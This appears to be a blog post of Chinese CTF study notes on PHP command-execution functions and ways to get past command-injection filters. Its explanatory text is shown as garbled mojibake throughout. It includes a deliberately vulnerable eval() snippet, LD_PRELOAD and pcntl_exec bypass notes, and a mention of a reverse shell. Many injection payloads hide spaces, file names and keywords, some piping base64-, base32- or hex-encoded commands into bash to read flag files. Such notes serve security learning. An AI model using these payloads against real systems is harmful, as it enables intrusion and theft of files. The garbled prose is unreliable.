<h4 id="passthru"><a href="#passthru" class="headerlink" title="passthru"></a><strong>passthru</strong></h4><p><strong>passthru(string $command,int &amp;$return_var&#x3D;? )</strong></p>
<p>command å‚æ•°:è¦æ‰§è¡Œçš„å‘½ä»¤</p>
<p>è¾“å‡ºäºŒè¿›åˆ¶æ•°æ®ï¼Œå¹¶ä¸”éœ€è¦ç›´æ¥ä¼ é€åˆ°æµè§ˆå™¨</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404152216415.png" alt="image-20240415221627371" loading="lazy"></p>
<hr>
<h4 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec"></a><strong>shell_exec</strong></h4><p><strong>shell_exec</strong>(string $cmd)</p>
<p>cmd å‚æ•°ï¼šè¦æ‰§è¡Œçš„å‘½ä»¤</p>
<p>ç¯å¢ƒæ‰§è¡Œå‘½ä»¤ï¼Œå¹¶ä¸”å°†å®Œæ•´çš„è¾“å‡ºä»¥å­—ç¬¦ä¸²çš„æ–¹å¼è¿”å›ã€‚åŠŸèƒ½ç­‰åŒäºåå¼•å·</p>
<p>å€Ÿç”¨ echo ï¼Œprintè¿”å›è¾“å‡ºç»“æœ</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404152232616.png" alt="image-20240415223256581" loading="lazy"></p>
<hr>
<h4 id="åå¼•å·"><a href="#åå¼•å·" class="headerlink" title="åå¼•å·"></a>åå¼•å·</h4><p><strong>åå¼•å·`cmd &#96;</strong></p>
<p>åœ¨æ— å­—æ¯ï¼Œæ— æ•°å­—çš„å›æ˜¾ä¸­ä½¿ç”¨æå¤š</p>
<p>åå¼•å·ä¹Ÿèƒ½æ‰§è¡Œç³»ç»ŸæŒ‡ä»¤</p>
<p>ç”¨echo&#x2F;printæ¥è¾“å‡º</p>
<hr>
<h4 id="popen"><a href="#popen" class="headerlink" title="popen"></a>popen</h4><p><strong>popen(string $command,string $mode)</strong></p>
<p>commmand:è¦æ‰§è¡Œçš„å‘½ä»¤</p>
<p>modeï¼šæ¨¡å¼ã€‚â€˜râ€™è¡¨ç¤ºé˜…è¯»ï¼Œâ€˜wâ€™è¡¨ç¤ºå†™å…¥</p>
<p>fgetsè·å–å†…å®¹-&gt;print_rè¾“å‡ºå†…å®¹</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404152243626.png" alt="image-20240415224354583" loading="lazy"></p>
<hr>
<p>äº†è§£ï¼Œè·Ÿpopenå‡½æ•°å·®ä¸å¤šï¼š<strong>proc_open($command,$descriptor_spec,$pipes,$cwd,$env_vars,$options)</strong></p>
<p>å‰ä¸‰ä¸ªå‚æ•°æ˜¯å¿…è¦çš„</p>
<p>commandï¼šè¦æ‰§è¡Œçš„å‘½ä»¤</p>
<p>descriptor_spec:å®šä¹‰æ•°ç»„çš„å†…å®¹</p>
<p>pipesï¼šè°ƒç”¨æ•°ç»„å†…å®¹</p>
<hr>
<h4 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec"></a>pcntl_exec</h4><p><strong>pcntl_exec(string $path,array$args&#x3D;?,array$envs&#x3D;?)</strong></p>
<p>pathå¿…é¡»æ—¶å¯æ‰§è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶è·¯å¾„æˆ–ä¸€ä¸ªåœ¨æ–‡ä»¶ç¬¬ä¸€è¡ŒæŒ‡å®šäº†ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„æ ‡å¤´çš„è„šæœ¬ï¼ˆæ¯”å¦‚æ–‡ä»¶ç¬¬ä¸€è¡Œæ˜¯#!&#x2F;user&#x2F;local&#x2F;bin&#x2F;perlçš„perlè„šæœ¬ï¼‰</p>
<p>argsæ˜¯ä¸€ä¸ªè¦ä¼ é€’ç»™ç¨‹åºçš„å‚æ•°çš„å­—ç¬¦ä¸²æ•°ç»„</p>
<p>envsæ˜¯ä¸€ä¸ªè¦ä¼ é€’ç»™ç¨‹åºä½œä¸ºç¯å¢ƒå˜é‡çš„å­—ç¬¦ä¸²æ•°ç»„ã€‚è¿™ä¸ªæ•°ç»„æ˜¯key&#x3D;&gt;valueæ ¼å¼çš„ï¼Œkeyä»£è¡¨è¦ä¼ é€’çš„ç¯å¢ƒå˜é‡çš„åç§°ï¼Œvalueä»£è¡¨è¯¥ç¯å¢ƒå˜é‡å€¼</p>
<p>åœ¨å½“å‰è¿›ç¨‹ç©ºé—´æ‰§è¡ŒæŒ‡å®šç¨‹åº</p>
<hr>
<h3 id="æ›¿æ¢ç»•è¿‡å‡½æ•°"><a href="#æ›¿æ¢ç»•è¿‡å‡½æ•°" class="headerlink" title="æ›¿æ¢ç»•è¿‡å‡½æ•°"></a>æ›¿æ¢ç»•è¿‡å‡½æ•°</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;content-type:text/html;charset=utf-8&quot;); </span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;cmd&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;cmd&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/exec|system|popen|proc_open|\`/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo &quot;ä½ æ˜¯é»‘å®¢ä¹ˆï¼Ÿ&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ²¡æœ‰è¿‡æ»¤passthruï¼Œä½¿ç”¨passthru(â€œlsâ€)ï¼ŒæŸ¥çœ‹ç›®å½•</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404161437313.png" alt="image-20240416143710195" loading="lazy"></p>
<p>å†æ¬¡ä½¿ç”¨passthru(â€œcat flag.phpâ€)åœ¨æºç é‡ŒæŸ¥çœ‹flagæ–‡ä»¶</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404161438824.png" alt="image-20240416143804717" loading="lazy"></p>
<hr>
<hr>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p><strong>LD_PRELOADç»•è¿‡åŸç†</strong>ï¼ˆä¸æ‡‚ï¼Œä¸ç†è§£ï¼‰</p>
<p>ä½¿ç”¨åœºæ™¯ï¼šdisable_functionsç¦ç”¨æ‰€æœ‰è‚¯ç”¨åˆ°å‘½ä»¤æ‰§è¡Œçš„å‡½æ•°</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404161440425.png" alt="image-20240416144048258" loading="lazy"></p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404161521446.png" alt="image-20240416152140349" loading="lazy"></p>
<hr>
<h3 id="mail"><a href="#mail" class="headerlink" title="mail()"></a>mail()</h3><h4 id="ç»•è¿‡æ¡ä»¶"><a href="#ç»•è¿‡æ¡ä»¶" class="headerlink" title="ç»•è¿‡æ¡ä»¶"></a>ç»•è¿‡æ¡ä»¶</h4><p>èƒ½å¤Ÿä¸Šä¼ è‡ªå·±çš„.soæ–‡ä»¶</p>
<p>èƒ½å¤Ÿæ§åˆ¶ç¯å¢ƒå˜é‡çš„å€¼ï¼ˆè®¾ç½®LD_PRELOADå˜é‡ï¼‰ï¼Œæ¯”å¦‚putenvå‡½æ•°æœªè¢«ç¦æ­¢</p>
<p>å­˜åœ¨å¯ä»¥æ§åˆ¶PHPå¯åŠ¨å¤–éƒ¨ç¨‹åºçš„å‡½æ•°å¹¶èƒ½æ‰§è¡Œ(å› ä¸ºæ–°è¿›ç¨‹å¯åŠ¨å°†åŠ è½½LD_PRELOADä¸­çš„.soæ–‡ä»¶)ï¼Œæ¯”å¦‚mail()ã€imap_mail()ã€mb_send_mail()å’Œerror_log()ç­‰ã€‚</p>
<h4 id="æ„é€ payload"><a href="#æ„é€ payload" class="headerlink" title="æ„é€ payload"></a>æ„é€ payload</h4><p>mailå‡½æ•°â€”â€”è°ƒç”¨å­ç¨‹åºâ€œ&#x2F;user&#x2F;sbin&#x2F;sendmailâ€â€”â€”è°ƒåŠ¨æ€é“¾æ¥åº“geteuidå‡½æ•°</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404222117087.png" alt="image-20240422211743826" loading="lazy"></p>
<hr>
<h4 id="EVIL-CMDLINE"><a href="#EVIL-CMDLINE" class="headerlink" title="EVIL_CMDLINE"></a>EVIL_CMDLINE</h4><p>æ‰§è¡Œå…¶ä»–å‘½ä»¤</p>
<hr>
<hr>
<h3 id="èšå‰‘åŠpcntlç»•è¿‡å‡½æ•°è¿‡æ»¤"><a href="#èšå‰‘åŠpcntlç»•è¿‡å‡½æ•°è¿‡æ»¤" class="headerlink" title="èšå‰‘åŠpcntlç»•è¿‡å‡½æ•°è¿‡æ»¤"></a>èšå‰‘åŠpcntlç»•è¿‡å‡½æ•°è¿‡æ»¤</h3><h4 id="èšå‰‘"><a href="#èšå‰‘" class="headerlink" title="èšå‰‘"></a>èšå‰‘</h4><p>ä½¿ç”¨å·¥å…·</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404222137215.png" alt="image-20240422213700006" loading="lazy"></p>
<hr>
<h4 id="pcntl-execå‡½æ•°"><a href="#pcntl-execå‡½æ•°" class="headerlink" title="pcntl_execå‡½æ•°"></a>pcntl_execå‡½æ•°</h4><p><strong>pcntl_exec(string $path,array$args&#x3D;?,array$envs&#x3D;?)</strong></p>
<p>pathå¿…é¡»æ—¶å¯æ‰§è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶è·¯å¾„æˆ–ä¸€ä¸ªåœ¨æ–‡ä»¶ç¬¬ä¸€è¡ŒæŒ‡å®šäº†ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„æ ‡å¤´çš„è„šæœ¬ï¼ˆæ¯”å¦‚æ–‡ä»¶ç¬¬ä¸€è¡Œæ˜¯#!&#x2F;user&#x2F;local&#x2F;bin&#x2F;perlçš„perlè„šæœ¬ï¼‰</p>
<p>argsæ˜¯ä¸€ä¸ªè¦ä¼ é€’ç»™ç¨‹åºçš„å‚æ•°çš„å­—ç¬¦ä¸²æ•°ç»„</p>
<p>envsæ˜¯ä¸€ä¸ªè¦ä¼ é€’ç»™ç¨‹åºä½œä¸ºç¯å¢ƒå˜é‡çš„å­—ç¬¦ä¸²æ•°ç»„ã€‚è¿™ä¸ªæ•°ç»„æ˜¯key&#x3D;&gt;valueæ ¼å¼çš„ï¼Œkeyä»£è¡¨è¦ä¼ é€’çš„ç¯å¢ƒå˜é‡çš„åç§°ï¼Œvalueä»£è¡¨è¯¥ç¯å¢ƒå˜é‡å€¼</p>
<p>åœ¨å½“å‰è¿›ç¨‹ç©ºé—´æ‰§è¡ŒæŒ‡å®šç¨‹åº</p>
<p>path:&#x2F;bin&#x2F;bash  args:-c&#x2F;bin&#x2F;ls</p>
<hr>
<p>infoä¿¡æ¯ï¼šæ²¡æœ‰ç¦ç”¨pcntl_execå‡½æ•°</p>
<p>pcntl_execå‡½æ•°æ²¡æœ‰å›æ˜¾</p>
<p>è§£å†³æ–¹æ³•ä¸€ï¼šcatæ–‡ä»¶å¹¶è¾“å‡ºåˆ°æœ‰æƒé™è¯»å–è·¯å¾„ï¼›</p>
<p>è§£å†³æ–¹æ³•äºŒï¼šshellåå¼¹</p>
<hr>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404222154839.png" alt="image-20240422215438700" loading="lazy"></p>
<hr>
<h3 id="æ“ä½œç³»ç»Ÿè¿æ¥ç¬¦"><a href="#æ“ä½œç³»ç»Ÿè¿æ¥ç¬¦" class="headerlink" title="æ“ä½œç³»ç»Ÿè¿æ¥ç¬¦"></a>æ“ä½œç³»ç»Ÿè¿æ¥ç¬¦</h3><h4 id="-1"><a href="#-1" class="headerlink" title=";"></a>;</h4><p>ä½¿å¤šä¸ªå‘½ä»¤æŒ‰é¡ºåºæ‰§è¡Œ</p>
<p>å‰é¢çš„å‘½ä»¤å’Œåé¢çš„å‘½ä»¤éƒ½ä¼šæ‰§è¡Œ</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404222159031.png" alt="image-20240422215911843" loading="lazy"></p>
<hr>
<h4 id="-2"><a href="#-2" class="headerlink" title="&amp;"></a>&amp;</h4><p>ä½¿å‘½ä»¤åœ¨åå°è¿è¡Œ</p>
<p>è¿™æ ·å°±å¯ä»¥åŒæ—¶æ‰§è¡Œå¤šæ¡å‘½ä»¤</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404222200738.png" alt="image-20240422220058617" loading="lazy"></p>
<hr>
<h4 id="-3"><a href="#-3" class="headerlink" title="&amp;&amp;"></a>&amp;&amp;</h4><p>è‹¥æœå‰é¢çš„å‘½ä»¤æ‰§è¡ŒæˆåŠŸ</p>
<p>åˆ™æ‰§è¡Œåé¢çš„å‘½ä»¤</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404222204341.png" alt="image-20240422220427195" loading="lazy"></p>
<hr>
<h4 id="-4"><a href="#-4" class="headerlink" title="|"></a>|</h4><p>å°†å‰é¢çš„å‘½ä»¤çš„è¾“å‡ºä½œä¸ºåé¢å‘½ä»¤çš„è¾“å…¥ï¼ŒæŠŠå‰é¢å‘½ä»¤çš„ç»“æœå½“æˆåé¢å‘½ä»¤çš„å‚æ•°</p>
<p>å‰é¢çš„å‘½ä»¤å’Œåé¢çš„å‘½ä»¤éƒ½ä¼šæ‰§è¡Œï¼Œä½†åªæ˜¾ç¤ºåé¢çš„å‘½ä»¤æ‰§è¡Œç»“æœ</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404222207997.png" alt="image-20240422220722894" loading="lazy"></p>
<hr>
<h4 id="-5"><a href="#-5" class="headerlink" title="||"></a>||</h4><p>ç±»ä¼¼äºç¨‹åºä¸­çš„if-elseè¯­å¥</p>
<p>è‹¥å‰é¢çš„å‘½ä»¤æ‰§è¡Œå¤±è´¥ï¼Œåˆ™åé¢çš„å‘½ä»¤å°±ä¸ä¼šæ‰§è¡Œ</p>
<p>è‹¥å‰é¢çš„å‘½ä»¤æ‰§è¡Œå¤±è´¥ï¼Œåˆ™æ‰§è¡Œåé¢çš„å‘½ä»¤</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404222212392.png" alt="image-20240422221217054" loading="lazy"></p>
<hr>
<h3 id="ç©ºæ ¼è¿‡æ»¤ç»•è¿‡"><a href="#ç©ºæ ¼è¿‡æ»¤ç»•è¿‡" class="headerlink" title="ç©ºæ ¼è¿‡æ»¤ç»•è¿‡"></a>ç©ºæ ¼è¿‡æ»¤ç»•è¿‡</h3><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404231458831.png" alt="image-20240423145809746" loading="lazy"></p>
<p><strong>ç»•è¿‡æ–¹æ³•</strong></p>
<p><strong>1.å¤§æ‹¬å·{cat,flag.txt};</strong></p>
<p><strong>2.$IFSä»£æ›¿ç©ºæ ¼ï¼›$IFS,${IFS},$IFS$9</strong></p>
<p>linuxä¸‹æœ‰ä¸€ä¸ªç‰¹æ®Šçš„ç¯å¢ƒå˜é‡å«åšIFSï¼Œå«åšå†…éƒ¨å­—æ®µåˆ†éš”ç¬¦</p>
<p>ä¾‹å­ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=ls$IFS-l</span><br></pre></td></tr></table></figure>

<p>å•çº¯$IFS2,IFS2è¢«bashè§£é‡Šå™¨å½“åšå˜é‡åï¼Œè¾“ä¸å‡ºæ¥ç»“æœï¼ŒåŠ ä¸€ä¸ª{}å°±å›ºå®šäº†å˜é‡å</p>
<p>ä¾‹å­</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=ls$&#123;IFS&#125;-l</span><br></pre></td></tr></table></figure>

<p>*$IFS$9-åé¢åŠ ä¸ª$ä¸{}ç±»ä¼¼ï¼Œèµ·æˆªæ–­ä½œç”¨ï¼Œ$9æ˜¯å½“å‰ç³»ç»Ÿshellè¿›ç¨‹çš„ç¬¬ä¹ä¸ªå‚æ•°çš„æŒæœ‰è€…ï¼Œå§‹ç»ˆä¸ºç©ºå­—ç¬¦</p>
<p>ä¾‹å­</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=ls$IFS$9-l</span><br></pre></td></tr></table></figure>

<p><strong>3.é‡å®šå‘å­—ç¬¦&lt;,&lt;&gt;;</strong></p>
<p>â€œ&lt;â€è¡¨ç¤ºçš„æ˜¯è¾“å…¥é‡å®šå‘çš„æ„æ€ï¼Œå°±æ˜¯æŠŠ&lt;åé¢è·Ÿçš„æ–‡ä»¶å–ä»£é”®ç›˜ä½œä¸ºæ–°çš„è¾“å…¥è®¾å¤‡</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?cmd=cat&lt;flag.php</span><br><span class="line"></span><br><span class="line">?cmd=cat&lt;&gt;flag.php</span><br></pre></td></tr></table></figure>

<p><strong>4.urlç¼–ç  %09ï¼ˆTABï¼‰ï¼Œ%20ï¼ˆspaceï¼‰ï¼›</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=cat%09flag.php</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="æ–‡ä»¶åè¿‡æ»¤ç»•è¿‡"><a href="#æ–‡ä»¶åè¿‡æ»¤ç»•è¿‡" class="headerlink" title="æ–‡ä»¶åè¿‡æ»¤ç»•è¿‡"></a>æ–‡ä»¶åè¿‡æ»¤ç»•è¿‡</h3><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404231519432.png" alt="image-20240423151936357" loading="lazy"></p>
<p><strong>ç»•è¿‡æ–¹æ³•</strong></p>
<p><strong>1.é€šé…ç¬¦ï¼Ÿ*ç»•è¿‡</strong></p>
<p>é€šé…ç¬¦æ˜¯ä¸€ç§ç‰¹æ®Šè¯­å¥ï¼Œä¸»è¦æœ‰é—®å·å’Œæ˜Ÿå·ï¼Œç”¨æ¥æ¨¡ç³Šæœç´¢æ–‡ä»¶</p>
<p>?åœ¨linuxé‡Œé¢å¯ä»¥è¿›è¡Œä»£æ›¿å­—æ¯ã€‚ï¼Ÿä»…ä»£è¡¨å˜ä¸ªå­—ç¬¦ä¸²ï¼Œä½†æ­¤å•å­—å¿…é¡»å­˜åœ¨</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#cat fl?g.tx?</span><br></pre></td></tr></table></figure>

<p>*åœ¨linuxé‡Œé¢å¯ä»¥è¿›è¡Œæ¨¡ç³ŠåŒ¹é…ã€‚*å¯ä»¥ä»£è¡¨ä»»ä½•å­—ç¬¦ä¸²</p>
<p><strong>2.å˜å¼•å·ï¼ŒåŒå¼•å·ç»•è¿‡</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">system(&#x27;cat fl&quot;&quot;ag.p&quot;&quot;hp&#x27;);</span><br><span class="line">å¤–å•å†…åŒï¼Œå¤–åŒå†…å˜</span><br></pre></td></tr></table></figure>

<p><strong>3.åæ–œæ \ç»•è¿‡</strong></p>
<p>æŠŠç‰¹æ®Šå­—ç¬¦å»æ‰åŠŸèƒ½æ€§ï¼Œå•çº¯è¡¨ç¤ºä¸ºå­—ç¬¦ä¸²</p>
<p>system(â€˜cat fl\ag.p\hpâ€™);</p>
<p>4.<strong>ç‰¹æ®Šå˜é‡ï¼š$1åˆ°$9ã€$@å’Œ$*ç­‰</strong></p>
<p>è¾“å‡ºä¸ºç©º</p>
<p>cat fl$1ag.t$9xt</p>
<p><strong>5.å†…è”æ‰§è¡Œ</strong></p>
<p>è‡ªå®šä¹‰å­—ç¬¦ä¸²ï¼Œå†æ‹¼æ¥èµ·æ¥</p>
<p>a&#x3D;f;d&#x3D;ag;c&#x3D;l;cat$a$c$d.txt</p>
<p><strong>6.åˆ©ç”¨linuxä¸­çš„ç¯å¢ƒå˜é‡</strong></p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404241718857.png" alt="image-20240424171843635" loading="lazy"></p>
<hr>
<h3 id="å¸¸è§æ–‡ä»¶è¯»å–å‘½ä»¤ç»•è¿‡"><a href="#å¸¸è§æ–‡ä»¶è¯»å–å‘½ä»¤ç»•è¿‡" class="headerlink" title="å¸¸è§æ–‡ä»¶è¯»å–å‘½ä»¤ç»•è¿‡"></a>å¸¸è§æ–‡ä»¶è¯»å–å‘½ä»¤ç»•è¿‡</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">more:ä¸€é¡µä¸€é¡µçš„æ˜¾ç¤ºæ¡£æ¡ˆå†…å®¹</span><br><span class="line">less:ä¸ more ç±»ä¼¼ head:æŸ¥çœ‹å¤´å‡ è¡Œ</span><br><span class="line">tac:ä»æœ€åä¸€è¡Œå¼€å§‹æ˜¾ç¤ºï¼Œå¯ä»¥çœ‹å‡º tac æ˜¯cat çš„åå‘æ˜¾ç¤º</span><br><span class="line">tail:æŸ¥çœ‹å°¾å‡ è¡Œ</span><br><span class="line">nlï¼šæ˜¾ç¤ºçš„æ—¶å€™ï¼Œé¡ºä¾¿è¾“å‡ºè¡Œå·,è·ŸcatåŠŸèƒ½ç±»ä¼¼</span><br><span class="line">od:ä»¥äºŒè¿›åˆ¶çš„æ–¹å¼è¯»å–æ¡£æ¡ˆå†…å®¹</span><br><span class="line">vi:ä¸€ç§ç¼–è¾‘å™¨ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥æŸ¥çœ‹</span><br><span class="line">vim:ä¸€ç§ç¼–è¾‘å™¨ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥æŸ¥çœ‹</span><br><span class="line">sort:å¯ä»¥æŸ¥çœ‹ï¼Œç”¨äºæ’åºæ–‡ä»¶</span><br><span class="line">passthru(&quot;/usr/bin/s?rt&quot; fl\ag.p\hp)</span><br><span class="line">uniq:å¯ä»¥æŸ¥çœ‹æŠ¥å‘Šæˆ–åˆ é™¤æ–‡ä»¶ä¸­é‡å¤çš„æ–‡ä»¶</span><br><span class="line">file -f:æŠ¥é”™å‡ºå…·ä½“å†…å®¹ </span><br><span class="line">grep åœ¨æ–‡ä»¶ä¸­æŸ¥æ‰¾æŸäº›å­—ç¬¦ä¸²</span><br><span class="line">1ã€åœ¨å½“å‰ç›®å½•ä¸­ï¼ŒæŸ¥æ‰¾åç¼€æœ‰ file å­—æ ·çš„æ–‡ä»¶ä¸­åŒ…å« test å­—ç¬¦ä¸²çš„æ–‡ä»¶ï¼Œå¹¶æ‰“å°å‡ºè¯¥å­—ç¬¦ä¸²çš„è¡Œã€‚æ­¤æ—¶ï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š grep test *file strings</span><br><span class="line">2.æŸ¥æ‰¾flagï¼š?cmd=passthru(&quot;grep fla fla*&quot;) ä»fla*æ–‡ä»¶ä¸­æŸ¥æ‰¾åŒ…å«flaçš„å­—ç¬¦ä¸²</span><br></pre></td></tr></table></figure>



<h3 id="ç¼–ç ç»•è¿‡"><a href="#ç¼–ç ç»•è¿‡" class="headerlink" title="ç¼–ç ç»•è¿‡"></a>ç¼–ç ç»•è¿‡</h3><p><strong>ç»•è¿‡æ–¹æ³•</strong></p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404241758202.png" alt="image-20240424175819140" loading="lazy"></p>
<p>1.base64ç¼–ç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">s=b&#x27;cat flag.php&#x27;</span><br><span class="line">e64=base64.b64encode(s) å‚æ•°sçš„ç±»å‹ä¸å¿…é¡»æ˜¯å­—èŠ‚åŒ…</span><br><span class="line">printï¼ˆe64ï¼‰</span><br><span class="line"></span><br><span class="line">#echo Y2FOIGZsYWcucGhw|base64 -d</span><br><span class="line">|æŠŠå‰é¢æŒ‡ä»¤æ‰§è¡Œçš„ç»“æœå˜æˆåé¢æŒ‡ä»¤çš„å‚æ•°</span><br><span class="line"></span><br><span class="line">æ‰§è¡Œå‘½ä»¤</span><br><span class="line">#echo Y2FOIGZsYWcucGhw|base64 |bash</span><br><span class="line">#`echo Y2FOIGZsYWcucGhw|base64`</span><br><span class="line">#$(echo Y2FOIGZsYWcucGhw|base64)</span><br></pre></td></tr></table></figure>

<p>2.base32ç¼–ç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">s=b&#x27;cat flag.php&#x27;</span><br><span class="line">e64=base64.b32encode(s) å‚æ•°sçš„ç±»å‹ä¸å¿…é¡»æ˜¯å­—èŠ‚åŒ…</span><br><span class="line">printï¼ˆe64ï¼‰</span><br><span class="line"></span><br><span class="line">?cmd=system(&#x27;echo&quot;MNQXIIDGNRQWOLTQNBYA====&quot;|base32 -d|/bin/bash&#x27;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>base32å’ŒBase64çš„åŒºåˆ†æ–¹æ³•<br>        çœ‹åˆ°ç¼–ç å†…å®¹ï¼Œåªæœ‰å¤§å†™å’Œæ•°å­—<br>        æ ¹æ®Base64å’ŒBase32 åŒºåˆ«ï¼š<br>        base64ä¸­åŒ…å«å¤§å†™å­—æ¯ï¼ˆA-Zï¼‰ï¼Œå°å†™å­—æ¯ï¼ˆa-zï¼‰ï¼Œæ•°å­—0â€”9ä»¥åŠ+&#x2F;ï¼›<br>        base32ä¸­åªåŒ…å«å¤§å†™å­—æ¯ï¼ˆA-Zï¼‰å’Œæ•°å­—234567</p>
<p>3.hexç¼–ç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line">s=b&#x27;tac flag&#x27;</span><br><span class="line">h=binascii.b2a_hex(s)</span><br><span class="line">print(h) </span><br><span class="line"></span><br><span class="line">æ‰§è¡Œå‘½ä»¤</span><br><span class="line">echo â€œ â€|xxd -r -p |bash</span><br><span class="line">xxd äºŒè¿›åˆ¶æ˜¾ç¤ºå’Œå¤„ç†æ–‡ä»¶å·¥å…·</span><br><span class="line">-r -på°†çº¯åå…­è¿›åˆ¶è½¬å‚¨çš„åå‘è¾“å‡ºæ‰“å°ä¸ºäº†ascllæ ¼å¼</span><br><span class="line">bashä¹Ÿå¯æ¢æˆshã€/bin/bashã€åå¼•å·</span><br></pre></td></tr></table></figure>

<p>4.shellcodeç¼–ç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">å°†ascllç å‰åŠ \x</span><br><span class="line">ç”¨printæ‰“å° //echo æ— æ³•æ‰§è¡Œ</span><br><span class="line">?cmd=passthru(&quot;print&#x27;shellcodeç¼–ç &#x27;|bash&quot;)</span><br></pre></td></tr></table></figure>

<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404241816512.png" alt="image-20240424181629448" loading="lazy"></p>
<hr>
<h3 id="æ— å›æ˜¾æ—¶é—´ç›²æ³¨"><a href="#æ— å›æ˜¾æ—¶é—´ç›²æ³¨" class="headerlink" title="æ— å›æ˜¾æ—¶é—´ç›²æ³¨"></a>æ— å›æ˜¾æ—¶é—´ç›²æ³¨</h3><p>é¡µé¢æ— æ³•shellåå¼¹æˆ–è€…æ— æ³•å›æ˜¾ï¼Œæˆ–è€…æ²¡æœ‰æƒé™ï¼Œå¯å°è¯•å‘½ä»¤ç›²æ³¨</p>
<p>æ›´å…·è¿”å›çš„æ—¶é—´æ¥è¿›è¡Œåˆ¤æ–­</p>
